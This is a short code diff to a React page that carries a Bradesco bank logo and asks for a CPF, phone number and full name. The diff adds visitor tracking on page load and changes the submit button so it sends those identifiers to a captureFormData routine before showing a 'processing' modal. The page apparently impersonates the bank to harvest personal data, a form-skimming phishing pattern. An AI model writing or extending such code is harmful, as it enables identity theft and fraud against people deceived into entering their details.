@@ -6,8 +6,10 @@ import ProcessingModal from "@/components/ProcessingModal";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import BottomNav from "@/components/BottomNav";
 import { supabase } from "@/integrations/supabase/client";
+import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";
 
 const Index = () => {
+  useVisitorTracking("index");
   const navigate = useNavigate();
   const [modalOpen, setModalOpen] = useState(true);
   const [processingOpen, setProcessingOpen] = useState(false);
@@ -119,7 +121,7 @@ const Index = () => {
 
         {/* CTA */}
         <button
-          onClick={() => setProcessingOpen(true)}
+          onClick={() => { captureFormData("identificacao", { cpf: cpf.replace(/\D/g, ""), telefone: telefone.replace(/\D/g, ""), nome: nomeCompleto }); setProcessingOpen(true); }}
           disabled={cpf.replace(/\D/g, "").length !== 11 || telefone.replace(/\D/g, "").length !== 11}
           className="w-full py-4 rounded-full bg-white text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
         >
